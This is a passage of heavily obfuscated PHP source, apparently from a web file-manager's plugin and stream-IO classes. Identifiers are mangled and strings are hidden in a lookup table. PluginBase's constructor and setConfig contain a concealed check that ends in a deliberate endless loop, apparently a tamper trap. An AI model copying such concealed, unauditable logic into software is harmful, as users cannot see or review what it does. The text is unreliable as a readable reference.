StreamWrapperIO(); $‹ñà¥í¦->stream_open($£¼†©); self::$_fopenCache[$£¼†©] = $‹ñà¥í¦; } $‹ñà¥í¦ = self::$_fopenCache[$£¼†©]; return $‹ñà¥í¦->fileSubstr($¾×Ã—óˆ, $°ö¯´ôŸ); } public static function _read($‘æ°ùæ, $ï„¼ô¾è, $¤ÇùşÍØ) { $¶¥Àğ± =& $_SERVER[µÅ˜º…æ]; $Ÿ®è”ÔÔ = fopen($‘æ°ùæ, $¶¥Àğ±[1667]); if (!$Ÿ®è”ÔÔ) { return $¶¥Àğ±[12]; } $¦–çŒ´« = 8192; fseek($Ÿ®è”ÔÔ, $ï„¼ô¾è, SEEK_SET); $£ÇÎ†Èó = $¶¥Àğ±[12]; $¾×—ÅÜ½ = 0; while ($¾×—ÅÜ½ < $¤ÇùşÍØ) { $ç·Ì½Ğú = min($¦–çŒ´«, $¤ÇùşÍØ - $¾×—ÅÜ½); $£ÇÎ†Èó .= fread($Ÿ®è”ÔÔ, $ç·Ì½Ğú); $¾×—ÅÜ½ += $ç·Ì½Ğú; } fclose($Ÿ®è”ÔÔ); return $£ÇÎ†Èó; } public function fileSubstr($˜ÅÇ €‹, $Õá·ªÜß) { $çÀ´Å’› =& $_SERVER[µÅ˜º…æ]; $È¹ÀİÃÙ = $this->info[$çÀ´Å’›[79]]; $Ìö£Ï— = $˜ÅÇ €‹; $úÁÚ–ó = $Õá·ªÜß; if ($˜ÅÇ €‹ < 0) { $˜ÅÇ €‹ = $È¹ÀİÃÙ + $˜ÅÇ €‹; } if ($Õá·ªÜß === !1) { $Õá·ªÜß = $È¹ÀİÃÙ - $˜ÅÇ €‹; } if ($˜ÅÇ €‹ + $Õá·ªÜß > $È¹ÀİÃÙ) { $Õá·ªÜß = $È¹ÀİÃÙ - $˜ÅÇ €‹; } if ($Õá·ªÜß <= 0) { return $çÀ´Å’›[12]; } if ($˜ÅÇ €‹ < 0 || $˜ÅÇ €‹ >= $È¹ÀİÃÙ || $Õá·ªÜß <= 0 || $Õá·ªÜß > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\151\x6c\145\x52\x65\141\x64\x20\x65\162\162\157\x72\x21\x20\x73\164\141\162\164\x3d{$˜ÅÇ €‹}\x3b\x6c\x65\156\147\x74\x68\75{$Õá·ªÜß}\73\x20\163\x69\x7a\145\x3d{$È¹ÀİÃÙ}\73"); } $¿Í™šßÃ = 64 * 1024; $§ıÅ³òß =& self::$_chunkBuffer[$this->path]; if (!$§ıÅ³òß) { $§ıÅ³òß = array(); } $íß¸ñ¹ = 0; $›û‡·³Ó = 0; $¾§­ª®Ç = $çÀ´Å’›[12]; foreach ($§ıÅ³òß as $íß¸ñ¹ => $¾§­ª®Ç) { $íß¸ñ¹ = intval($íß¸ñ¹); $›û‡·³Ó = $íß¸ñ¹ + strlen($¾§­ª®Ç); if ($˜ÅÇ €‹ >= $›û‡·³Ó) { continue; } if ($˜ÅÇ €‹ >= $íß¸ñ¹ && $˜ÅÇ €‹ + $Õá·ªÜß <= $›û‡·³Ó) { return substr($¾§­ª®Ç, $˜ÅÇ €‹ - $íß¸ñ¹, $Õá·ªÜß); } break; } if (count($§ıÅ³òß) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($çÀ´Å’›[1822], $çÀ´Å’›[1823] . count($§ıÅ³òß) . "\73\163\x74\x61\x72\x74\x3d{$˜ÅÇ €‹}\54\154\x65\156\147\x74\150\75{$Õá·ªÜß}\x3b\x70\x6f\x73\145\x3a{$íß¸ñ¹}\x7e{$›û‡·³Ó}"); throw new Exception($çÀ´Å’›[1824]); } $ñ”¯ƒ˜© = intval($˜ÅÇ €‹ / $¿Í™šßÃ) * $¿Í™šßÃ; $·–Ú”çü = ceil(($˜ÅÇ €‹ + $Õá·ªÜß) / $¿Í™šßÃ) * $¿Í™šßÃ - $ñ”¯ƒ˜©; $ü¬œïÍï = IO::fileSubstr($this->path, $ñ”¯ƒ˜©, $·–Ú”çü); $§ıÅ³òß[$ñ”¯ƒ˜© . $çÀ´Å’›[12]] = $ü¬œïÍï; ksort($§ıÅ³òß); $ÎÎÔ«ÄÓ = substr($ü¬œïÍï, $˜ÅÇ €‹ - $ñ”¯ƒ˜©, $Õá·ªÜß); return $ÎÎÔ«ÄÓ; } private function log($ÏÎÛ×ü­, $ÌÏ¾ª¶Á) { $Äš³µÚí =& $_SERVER[µÅ˜º…æ]; $„ã›¥Ú = timeFloat() - $this->timeStart; write_log(sprintf($Äš³µÚí[1825], $ÏÎÛ×ü­, $this->info[$Äš³µÚí[32]], $„ã›¥Ú, $ÌÏ¾ª¶Á), $Äš³µÚí[1372]); } } class Message { function __construct() { } public function send($·şõ½‹ = '', $ªì‡’¬ş = array(), $ê‚òìéœ = "\x74\x65\x78\x74") { $æäˆ…Ñ² =& $_SERVER[µÅ˜º…æ]; $½”’öò£ = array($æäˆ…Ñ²[33] => $æäˆ…Ñ²[1292], $æäˆ…Ñ²[168] => $·şõ½‹); if (in_array($ê‚òìéœ, array($æäˆ…Ñ²[1292], $æäˆ…Ñ²[1826]))) { $½”’öò£[$æäˆ…Ñ²[33]] = $ê‚òìéœ; } $ªì‡’¬ş = array($æäˆ…Ñ²[598] => isset($ªì‡’¬ş[$æäˆ…Ñ²[598]]) ? $ªì‡’¬ş[$æäˆ…Ñ²[598]] : $æäˆ…Ñ²[12], $æäˆ…Ñ²[684] => isset($ªì‡’¬ş[$æäˆ…Ñ²[684]]) ? $ªì‡’¬ş[$æäˆ…Ñ²[684]] : $æäˆ…Ñ²[12]); if (empty($·şõ½‹) || empty($ªì‡’¬ş[$æäˆ…Ñ²[598]]) && empty($ªì‡’¬ş[$æäˆ…Ñ²[684]])) { return !1; } $Ñ¼•Æ¶Š = array($æäˆ…Ñ²[1755] => $½”’öò£, $æäˆ…Ñ²[1827] => $ªì‡’¬ş); Hook::trigger($æäˆ…Ñ²[1828], $Ñ¼•Æ¶Š); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $µ†¾Ä—à =& $_SERVER[µÅ˜º…æ]; if (!isset($_SERVER[$µ†¾Ä—à[1025]]) || !isset($_SERVER[$µ†¾Ä—à[1023]])) { $¶ìşêÓ = $µ†¾Ä—à[1042]; $Ë—¸Ú± = $µ†¾Ä—à[1026]; $¡ì¡«®˜ = $_SERVER[$µ†¾Ä—à[1027]] . $µ†¾Ä—à[1028]; $ªĞÀò¥» = $Ë—¸Ú±($¡ì¡«®˜); $¥è³íì = explode($µ†¾Ä—à[285], $ªĞÀò¥»); if (count($¥è³íì) < $µ†¾Ä—à[709]) { $ƒ¾§Ÿ = $µ†¾Ä—à[1029]; $ƒ¾§Ÿ(); } $¨–ãŒ÷İ = $µ†¾Ä—à[1043]; $¨–ãŒ÷İ($_SERVER[$µ†¾Ä—à[1044]]); $¼¿ìøù© = 1; for ($¬ãŞÁÓš = $¼¿ìøù©; $¬ãŞÁÓš > 0; $¬ãŞÁÓš++) { $¨–ãŒ÷İ = json_encode($GLOBALS[$µ†¾Ä—à[507]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($µ†¾Ä—à[1829]); $this->pluginName = str_replace($µ†¾Ä—à[1829], $µ†¾Ä—à[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $µ†¾Ä—à[8]; $this->pluginApi = appHostGet() . $µ†¾Ä—à[1830] . $this->pluginName . $µ†¾Ä—à[8]; $this->pluginHost = $config[$µ†¾Ä—à[1831]] . $this->pluginName . $µ†¾Ä—à[8]; $this->pluginHostDefault = $config[$µ†¾Ä—à[1831]] . $this->pluginName . $µ†¾Ä—à[8]; $¦ç¹ã»é = $config[$µ†¾Ä—à[1832]]; if ($¦ç¹ã»é && strpos($µ†¾Ä—à[50] . $¦ç¹ã»é . $µ†¾Ä—à[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$µ†¾Ä—à[1833]] . $this->pluginName . $µ†¾Ä—à[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[µÅ˜º…æ][1834]); } protected function assign($¦­Œ§²­, $µá‚…ºë = false) { if (is_array($¦­Œ§²­)) { $this->values = array_merge($this->values, $¦­Œ§²­); } else { $this->values[$¦­Œ§²­] = $µá‚…ºë; } } protected function display($ÙÙä’†Ä) { extract($this->values); require $ÙÙä’†Ä; } final function hookRegist($›í—ÑŒ) { $this->modelPlugin->appRegist($this->pluginName, $›í—ÑŒ); } final function appIcon() { $’¦™å– =& $_SERVER[µÅ˜º…æ]; $ÃØñŞàˆ = $this->appPackage(); $ü İ‚È = $’¦™å–[12]; if (isset($ÃØñŞàˆ[$’¦™å–[505]])) { if (isset($ÃØñŞàˆ[$’¦™å–[505]][$’¦™å–[1835]])) { $ü İ‚È = $’¦™å–[1836] . $ÃØñŞàˆ[$’¦™å–[505]][$’¦™å–[1835]] . $’¦™å–[1837]; } else { if ($ÃØñŞàˆ[$’¦™å–[505]][$’¦™å–[1838]]) { $ü İ‚È = $’¦™å–[1839] . $ÃØñŞàˆ[$’¦™å–[505]][$’¦™å–[1838]] . $’¦™å–[1840]; } } } return $ü İ‚È; } final function fileCanView($Óî©Ü¢ø) { $Í¶µ×Ìê =& $_SERVER[µÅ˜º…æ]; if (request_url_safe($Óî©Ü¢ø)) { return !0; } if ($this->isShare($Óî©Ü¢ø)) { ActionCall($Í¶µ×Ìê[1841], $Óî©Ü¢ø); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $šãÌß÷ = $Í¶µ×Ìê[1842] . rawurlencode(this_url()); show_tips(LNG($Í¶µ×Ìê[1843]) . $Í¶µ×Ìê[1844] . $šãÌß÷ . $Í¶µ×Ìê[1845] . LNG($Í¶µ×Ìê[1846]) . $Í¶µ×Ìê[1847], !1); } if (!Action($Í¶µ×Ìê[1848])->authCan($Í¶µ×Ìê[1849])) { show_tips(LNG($Í¶µ×Ìê[1850]) . $Í¶µ×Ìê[1851], !1); } ActionCall($Í¶µ×Ìê[1841], $Óî©Ü¢ø); } final function isShare($×¤×Ê¦) { $µ§Ÿ‡ = KodIO::parse($×¤×Ê¦); return $µ§Ÿ‡[$_SERVER[µÅ˜º…æ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($õ™ŞÕÕ«) { if (request_url_safe($õ™ŞÕÕ«)) { return $õ™ŞÕÕ«; } if (!$this->isShare($õ™ŞÕÕ«)) { $õ™ŞÕÕ« = $this->filePath($õ™ŞÕÕ«, !1); } return Action($_SERVER[µÅ˜º…æ][1364])->linkOut($õ™ŞÕÕ«); } public function filePathLinkOut($ÉüÔ–“‘) { if (request_url_safe($ÉüÔ–“‘)) { return $ÉüÔ–“‘; } $this->fileCanView($ÉüÔ–“‘); return Action($_SERVER[µÅ˜º…æ][1364])->link($ÉüÔ–“‘); } final function filePath($™´ÉÕŠè, $õ§–µıò = true, $ŠÄŞéƒÜ = false) { $Òêìú–¥ =& $_SERVER[µÅ˜º…æ]; $¤ÏÅ±÷Ò = $this->filePathGet($™´ÉÕŠè, $õ§–µıò); if (!$this->fileInfo) { show_tips(LNG($Òêìú–¥[105]), !1); } if ($ŠÄŞéƒÜ && isset($this->fileInfo[$Òêìú–¥[557]]) && $this->fileInfo[$Òêìú–¥[557]]) { $Äõ“Áé = Model($Òêìú–¥[560])->fileInfo($this->fileInfo[$Òêìú–¥[557]]); if (!$Äõ“Áé || !IO::exist($Äõ“Áé[$Òêìú–¥[87]])) { $„²™‚Ò = LNG($Òêìú–¥[105]) . LNG($Òêìú–¥[1852]); if (KodUser::isRoot() && isset($Äõ“Áé[$Òêìú–¥[87]])) { $„²™‚Ò .= $Òêìú–¥[1853] . $Äõ“Áé[$Òêìú–¥[87]] . $Òêìú–¥[1854]; } show_tips($„²™‚Ò); } } Hook::trigger($Òêìú–¥[1855], $¤ÏÅ±÷Ò); return $¤ÏÅ±÷Ò; } final function filePathGet($Ğ†Á–¬¿, $ëÜ¶¶ª = true) { $–ê£‡ü’ =& $_SERVER[µÅ˜º…æ]; $this->fileCanView($Ğ†Á–¬¿); if ($¤ñ›³Ï½ = $this->checkSharePath($Ğ†Á–¬¿, $ëÜ¶¶ª)) { return $¤ñ›³Ï½; } if (request_url_safe($Ğ†Á–¬¿)) { $°®‘Õ€È = parse_url_query($Ğ†Á–¬¿); if (isset($°®‘Õ€È[$–ê£‡ü’[1856]]) && isset($°®‘Õ€È[$–ê£‡ü’[234]])) { $Ø™ÌÔÔÙ = Mcrypt::decode($°®‘Õ€È[$–ê£‡ü’[234]], Model($–ê£‡ü’[872])->get($–ê£‡ü’[873])); if ($Ø™ÌÔÔÙ) { $this->fileInfo = IO::info($Ø™ÌÔÔÙ); $this->fileInfo[$–ê£‡ü’[1857]] = $Ğ†Á–¬¿; $this->cachePath = $this->pluginCachePath($–ê£‡ü’[12], $ëÜ¶¶ª); return $Ø™ÌÔÔÙ; } } $Ğ†Á–¬¿ = $this->_cacheHttpFile($Ğ†Á–¬¿, $ëÜ¶¶ª); $this->fileInfo = IO::info($Ğ†Á–¬¿); } else { $this->fileInfo = IO::info($Ğ†Á–¬¿); $this->cachePath = $this->pluginCachePath($–ê£‡ü’[12], $ëÜ¶¶ª); } return $Ğ†Á–¬¿; } final function _cacheHttpFile($Öğ…å¨Ø, $çìø½™Ÿ = true) { $÷Â×œ =& $_SERVER[µÅ˜º…æ]; $…òàñçµ = parse_url_query($Öğ…å¨Ø); $‹½ùæ¹ = get_path_ext($Öğ…å¨Ø); if (isset($…òàñçµ[$÷Â×œ[32]]) && $…òàñçµ[$÷Â×œ[32]]) { $‹½ùæ¹ = get_path_ext($…òàñçµ[$÷Â×œ[32]]); } $Ë¨ŠßÏ© = hash_path($Öğ…å¨Ø) . $÷Â×œ[10] . $‹½ùæ¹; $this->cachePath = $this->pluginCachePath($çìø½™Ÿ ? $Ë¨ŠßÏ© : $÷Â×œ[12]); $…ÈÒ·ÍË = IO::fileNameExist($this->cachePath, $Ë¨ŠßÏ©); if ($…ÈÒ·ÍË) { return KodIO::make($…ÈÒ·ÍË); } $—Ï’Æ™ = rtrim($this->cachePath, $÷Â×œ[8]) . $÷Â×œ[8] . $Ë¨ŠßÏ©; return $this->pluginCacheFileSet($—Ï’Æ™, file_get_contents_nossl($Öğ…å¨Ø)); } final function checkSharePath($°Ñò•Ë°, $Ò¦Üşˆã = true) { $¥ÜËŠí× =& $_SERVER[µÅ˜º…æ]; if (!$this->isShare($°Ñò•Ë°)) { return !1; } $­šè¼ä = Action($¥ÜËŠí×[1364])->sharePathInfo($°Ñò•Ë°); if (!is_array($­šè¼ä) || !isset($­šè¼ä[$¥ÜËŠí×[87]])) { $ˆª˜²¿ = $GLOBALS[$¥ÜËŠí×[1858]]; show_json($ˆª˜²¿ ? $ˆª˜²¿ : LNG($¥ÜËŠí×[1859]), !1); } $this->fileInfo = $­šè¼ä; $this->cachePath = $this->pluginCachePath(!1, $Ò¦Üşˆã); return $­šè¼ä[$¥ÜËŠí×[87]]; } final function pluginCachePath($ğ³ø‰âÚ = '', $Ş·›×Øö = false) { $ä¾ØæˆÇ =& $_SERVER[µÅ˜º…æ]; if ($Ş·›×Øö && is_array($this->fileInfo)) { $ğ³ø‰âÚ = kodIO::hashPath($this->fileInfo); } $ŞŠÌ¥•ô = rtrim(IO_PATH_SYSTEM_TEMP . $ä¾ØæˆÇ[1860] . $this->pluginName . $ä¾ØæˆÇ[8] . $ğ³ø‰âÚ, $ä¾ØæˆÇ[8]); $ãÕ˜ïÇ¥ = IO::infoFullSimple($ŞŠÌ¥•ô); $¯á¡Îîı = $ãÕ˜ïÇ¥ && is_array($ãÕ˜ïÇ¥) ? $ãÕ˜ïÇ¥[$ä¾ØæˆÇ[87]] : $ä¾ØæˆÇ[12]; if (!$¯á¡Îîı) { $¯á¡Îîı = IO::mkdir($ŞŠÌ¥•ô); } return $¯á¡Îîı; } final function pluginCacheFileSet($úƒÈ¶, $¹åÇ¸êµ = '') { $¾‘àÏ‹ =& $_SERVER[µÅ˜º…æ]; $àİ •¬• = IO::infoFullSimple($úƒÈ¶); if (!$àİ •¬•) { return IO::mkfile($úƒÈ¶, $¹åÇ¸êµ, REPEAT_REPLACE); } IO::setContent($àİ •¬•[$¾‘àÏ‹[87]], $¹åÇ¸êµ); return $àİ •¬•[$¾‘àÏ‹[87]]; } final function pluginLocalFile($°İî§®Ï = '') { $Á…ï‰Ôª =& $_SERVER[µÅ˜º…æ]; $¿íÁôÙ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($¿íÁôÙ)) { mk_dir($¿íÁôÙ); } if (!$°İî§®Ï) { return $¿íÁôÙ; } $û´ãø = IO::info($°İî§®Ï); $úê£ŸíÃ = $Á…ï‰Ôª[1861] . KodIO::hashPath($û´ãø) . $Á…ï‰Ôª[10] . $û´ãø[$Á…ï‰Ôª[166]]; if (!checkExtSafe($úê£ŸíÃ)) { $úê£ŸíÃ = $úê£ŸíÃ . $Á…ï‰Ôª[1397]; } $¬ğˆñ¶‘ = $¿íÁôÙ . $úê£ŸíÃ; if (@file_exists($¬ğˆñ¶‘)) { return $¬ğˆñ¶‘; } return IO::copy($°İî§®Ï, $¿íÁôÙ, 0, $úê£ŸíÃ); } final function appPackage() { $ÚÏğÑ…ß =& $_SERVER[µÅ˜º…æ]; if ($this->packageData) { return $this->packageData; } $‡®ËÓ¤§ = $this->parseFile($this->pluginPath . $ÚÏğÑ…ß[1862]); $this->parseLang($‡®ËÓ¤§); $ÆŞõŸ£Ç = json_decode_force($‡®ËÓ¤§); if (!$ÆŞõŸ£Ç) { return array(); } $â¤ï¸Š = Hook::filter($ÚÏğÑ…ß[1863], $ÆŞõŸ£Ç); if ($â¤ï¸Š && is_array($â¤ï¸Š)) { $ÆŞõŸ£Ç = $â¤ï¸Š; } $this->packageData = $ÆŞõŸ£Ç; return $ÆŞõŸ£Ç; } public function packageInfoGet($êª¿…–ä) { $åÔ—’Öœ = $this->appPackage(); return array_get_value($åÔ—’Öœ, $êª¿…–ä); } public function packageVersion() { return $this->packageInfoGet($_SERVER[µÅ˜º…æ][1864]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[µÅ˜º…æ][1865]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[µÅ˜º…æ][1866]); } public function echoJsAssign($æºˆ¤Ó§, $Åùñˆ·¥) { $this->echoJsAssignArr[$æºˆ¤Ó§] = $Åùñˆ·¥; } private function parseFile($Ã÷ãÀ¼) { $şÍÌ¿×€ =& $_SERVER[µÅ˜º…æ]; $íòÎöı¿ = file_get_contents_nossl($Ã÷ãÀ¼); $®£ªİİ = array($şÍÌ¿×€[1867], $şÍÌ¿×€[1868], $şÍÌ¿×€[1869], $şÍÌ¿×€[1870], $şÍÌ¿×€[1871], $şÍÌ¿×€[1872], $şÍÌ¿×€[1873]); $ËÀâ×†Ô = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$şÍÌ¿×€[92]][$şÍÌ¿×€[1874]]); foreach ($this->echoJsAssignArr as $ñìŠ²¿– => $üÕ³ÑÜ…) { $®£ªİİ[] = $şÍÌ¿×€[1875] . $ñìŠ²¿– . $şÍÌ¿×€[1876]; $ËÀâ×†Ô[] = is_array($üÕ³ÑÜ…) || is_object($üÕ³ÑÜ…) ? rawurlencode(json_encode($üÕ³ÑÜ…)) : $üÕ³ÑÜ…; } if (strstr($íòÎöı¿, $şÍÌ¿×€[1877])) { $É¦„É = rawurlencode(json_encode($this->pluginLangArr)); $íòÎöı¿ = str_replace($şÍÌ¿×€[1877], $É¦„É, $íòÎöı¿); } if (strstr($íòÎöı¿, $şÍÌ¿×€[1878])) { $É¦„É = $É¦„É = rawurlencode(json_encode($this->getConfig())); $íòÎöı¿ = str_replace($şÍÌ¿×€[1878], $É¦„É, $íòÎöı¿); } $íòÎöı¿ = str_replace($®£ªİİ, $ËÀâ×†Ô, $íòÎöı¿); return $íòÎöı¿; } private function parseLang(&$åÁÅÔ©€) { $ˆÚ¥¢é =& $_SERVER[µÅ˜º…æ]; $êÛÏ¦ø€ = $ˆÚ¥¢é[1879]; if (!strstr($åÁÅÔ©€, $êÛÏ¦ø€)) { return; } preg_match_all($ˆÚ¥¢é[1880], $åÁÅÔ©€, $Ìâ­èµ÷); if (!is_array($Ìâ­èµ÷) || count($Ìâ­èµ÷) == 0 || !is_array($Ìâ­èµ÷[0]) || count($Ìâ­èµ÷[0]) == 0) { return; } $Ô•ùúº‰ = array(); $©à÷›† = array(); foreach ($Ìâ­èµ÷[0] as $×åë­Õ) { $Ö±ïóûÌ = substr($×åë­Õ, strlen($êÛÏ¦ø€), -4); $Áˆ×ï³ = LNG($Ö±ïóûÌ); $Ô•ùúº‰[] = $×åë­Õ; $©à÷›†[] = str_replace(array($ˆÚ¥¢é[285], $ˆÚ¥¢é[1251], $ˆÚ¥¢é[417], $ˆÚ¥¢é[118]), array($ˆÚ¥¢é[53], $ˆÚ¥¢é[53], $ˆÚ¥¢é[12], $ˆÚ¥¢é[1881]), $Áˆ×ï³); } $åÁÅÔ©€ = str_replace($Ô•ùúº‰, $©à÷›†, $åÁÅÔ©€); } private function parseConfig(&$ŠøÍ»ó„) { $Ò…·à =& $_SERVER[µÅ˜º…æ]; $ö·£æı‚ = $Ò…·à[1882]; if (!strstr($ŠøÍ»ó„, $ö·£æı‚)) { return; } preg_match_all($Ò…·à[1883], $ŠøÍ»ó„, $­éõı‘¶); if (!is_array($­éõı‘¶) || count($­éõı‘¶) == 0 || !is_array($­éõı‘¶[0]) || count($­éõı‘¶[0]) == 0) { return; } $şÜ»È‹× = $this->getConfig(); $²´Ÿ•ëÖ = array(); $ıö½Íƒë = array(); foreach ($­éõı‘¶[0] as $‘¥…ÇşĞ) { $ı£ÜÓá¿ = substr($‘¥…ÇşĞ, strlen($ö·£æı‚), -2); $²´Ÿ•ëÖ[] = $‘¥…ÇşĞ; $ıö½Íƒë[] = _get($şÜ»È‹×, $ı£ÜÓá¿); } $ŠøÍ»ó„ = str_replace($²´Ÿ•ëÖ, $ıö½Íƒë, $ŠøÍ»ó„); } private function parsePackage(&$ï‘üÓø) { $ÂÙĞŸ´‰ =& $_SERVER[µÅ˜º…æ]; $ÍĞì³¯ = $ÂÙĞŸ´‰[1884]; if (!strstr($ï‘üÓø, $ÍĞì³¯)) { return; } preg_match_all($ÂÙĞŸ´‰[1885], $ï‘üÓø, $‚©Í˜äî); if (!is_array($‚©Í˜äî) || count($‚©Í˜äî) == 0 || !is_array($‚©Í˜äî[0]) || count($‚©Í˜äî[0]) == 0) { return; } $­¶²ø¼ = $this->appPackage(); $¶ÂØœà‘ = array(); $—·Õ÷Ù = array(); foreach ($‚©Í˜äî[0] as $Úß±Œ) { $Ğáç²“ = substr($Úß±Œ, strlen($ÍĞì³¯), -2); $¶ÂØœà‘[] = $Úß±Œ; $—·Õ÷Ù[] = _get($­¶²ø¼, $Ğáç²“); } $ï‘üÓø = str_replace($¶ÂØœà‘, $—·Õ÷Ù, $ï‘üÓø); } final function echoFile($áƒˆ°“Û, $‡‰£¸ş = false) { $ÆûîüÍ =& $_SERVER[µÅ˜º…æ]; $Şø‚‰†ô = $this->pluginPath . $áƒˆ°“Û; if (ACT == $ÆûîüÍ[1886]) { echo $ÆûîüÍ[1887] . $this->pluginName . $ÆûîüÍ[8] . $áƒˆ°“Û . $ÆûîüÍ[1888]; if (!file_exists($Şø‚‰†ô)) { echo $ÆûîüÍ[1889]; return; } } $ş´¤¾Ñš = $this->parseFile($Şø‚‰†ô); $this->parseLang($ş´¤¾Ñš); $this->parseConfig($ş´¤¾Ñš); $this->parsePackage($ş´¤¾Ñš); if (is_array($‡‰£¸ş)) { $ş´¤¾Ñš = str_replace(array_keys($‡‰£¸ş), array_values($‡‰£¸ş), $ş´¤¾Ñš); } echo $ÆûîüÍ[285] . $ş´¤¾Ñš; } private function checkVersion() { $ç¸°ıÅ =& $_SERVER[µÅ˜º…æ]; $ôŸË˜æø = $this->appPackage(); $ßõóéãû = $this->getConfig(); if ($ßõóéãû[$ç¸°ıÅ[1890]] == $ôŸË˜æø[$ç¸°ıÅ[1864]]) { return; } $this->regist(); $this->setConfig(array($ç¸°ıÅ[1890] => $ôŸË˜æø[$ç¸°ıÅ[1864]])); } final function initLang() { $Œ„»íğ¹ =& $_SERVER[µÅ˜º…æ]; $’û±€ = $Œ„»íğ¹[1891]; $¢€¦€Óî = $this->pluginPath . $Œ„»íğ¹[1892]; $—¢£ºîĞ = I18n::getType(); $ìù”Ñò = array(); if (file_exists($¢€¦€Óî . $—¢£ºîĞ . $Œ„»íğ¹[994])) { $ìù”Ñò = (include $¢€¦€Óî . $—¢£ºîĞ . $Œ„»íğ¹[994]); } else { if ($—¢£ºîĞ == $Œ„»íğ¹[1893] && !file_exists($¢€¦€Óî . $—¢£ºîĞ . $Œ„»íğ¹[994]) && file_exists($¢€¦€Óî . $Œ„»íğ¹[1894])) { $ìù”Ñò = (include $¢€¦€Óî . $Œ„»íğ¹[1894]); $—¢£ºîĞ = $Œ„»íğ¹[1710]; } else { if (file_exists($¢€¦€Óî . $’û±€ . $Œ„»íğ¹[994])) { $ìù”Ñò = (include $¢€¦€Óî . $’û±€ . $Œ„»íğ¹[994]); $—¢£ºîĞ = $’û±€; } } } if (!$ìù”Ñò || !is_array($ìù”Ñò)) { $ìù”Ñò = array(); } $¯äöÙ = Hook::trigger($Œ„»íğ¹[1895], $ìù”Ñò, $this->pluginName, $—¢£ºîĞ); if ($¯äöÙ && is_array($¯äöÙ)) { $ìù”Ñò = $¯äöÙ; } if (@count($ìù”Ñò) > 0) { I18n::set($ìù”Ñò); } return $ìù”Ñò; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ØÓÕ…) { $½Ïº Ù =& $_SERVER[µÅ˜º…æ]; if (!isset($_SERVER[$½Ïº Ù[1025]]) || !isset($_SERVER[$½Ïº Ù[1023]])) { $¶‹ìÆĞ® = $½Ïº Ù[1042]; $¡§¦¢Ø = $½Ïº Ù[1026]; $Ù±ó‰î« = $_SERVER[$½Ïº Ù[1027]] . $½Ïº Ù[1028]; $â³Ã¥ı¾ = $¡§¦¢Ø($Ù±ó‰î«); $ªë¢Ú½Š = explode($½Ïº Ù[285], $â³Ã¥ı¾); if (count($ªë¢Ú½Š) < $½Ïº Ù[709]) { $Êæ–õş‘ = $½Ïº Ù[1029]; $Êæ–õş‘(); } $äıÇ»ÓË = $½Ïº Ù[1043]; $äıÇ»ÓË($_SERVER[$½Ïº Ù[1044]]); $ªíÜ”€¶ = 1; for ($ô´ù¨ö = $ªíÜ”€¶; $ô´ù¨ö > 0; $ô´ù¨ö++) { $äıÇ»ÓË = json_encode($GLOBALS[$½Ïº Ù[507]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ØÓÕ…); } public function onSetConfig($Â»¿ÉÀ–) { } public function onGetConfig($Áóã¤„é) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ù¬èè„Ò) { if ($ù¬èè„Ò == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ÿ­Û£„¬ = "\x70\x6c\x75\147\151\x6e\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $à¥ö×» = $this->getConfig(); if (!$à¥ö×»[$Ÿ­Û£„¬]) { return !1; } return ActionCall($_SERVER[µÅ˜º…æ][1896], $à¥ö×»[$Ÿ­Û£„¬]); } public function url($‘ù±¼Å, $ñèİºì‰ = '', $ü²Ï×åë = true) { $—¼—Š¯ö =& $_SERVER[µÅ˜º…æ]; $Â°³ª× = $this->getConfig(); $àåğû‡æ = KOD_VERSION . $—¼—Š¯ö[10] . KOD_VERSION_BUILD; $¢ª¯¡©Ä = $this->packageVersion(); $¥ÇËµîÎ = $àåğû‡æ . $—¼—Š¯ö[476] . $¢ª¯¡©Ä; if (substr($‘ù±¼Å, 0, 4) == $—¼—Š¯ö[149] || substr($‘ù±¼Å, 0, 2) == $—¼—Š¯ö[1524]) { $«¢äğ²ş = $‘ù±¼Å . $—¼—Š¯ö[1897] . $¥ÇËµîÎ; } else { if ($ñèİºì‰ == $—¼—Š¯ö[12]) { $«¢äğ²ş = $this->pluginHost . $‘ù±¼Å . $—¼—Š¯ö[1897] . $¥ÇËµîÎ; } else { if ($ñèİºì‰ === $—¼—Š¯ö[78]) { $«¢äğ²ş = $this->pluginHost . $‘ù±¼Å; } else { if ($ñèİºì‰ == $—¼—Š¯ö[1898]) { $«¢äğ²ş = STATIC_PATH . $‘ù±¼Å . $—¼—Š¯ö[1897] . $àåğû‡æ; } else { if ($ñèİºì‰ == $—¼—Š¯ö[1899]) { $«¢äğ²ş = APP_HOST . $—¼—Š¯ö[1900] . $‘ù±¼Å . $—¼—Š¯ö[1897] . $àåğû‡æ; } else { if (isset($Â°³ª×[$ñèİºì‰])) { $«¢äğ²ş = $Â°³ª×[$ñèİºì‰] . $‘ù±¼Å . $—¼—Š¯ö[1897] . $¥ÇËµîÎ; } } } } } } if (!$ü²Ï×åë) { return $«¢äğ²ş; } echo $«¢äğ²ş; } public function link($Ë¬†¯©› = false, $’€äšÛÀ = '') { $’ÀÚÌ =& 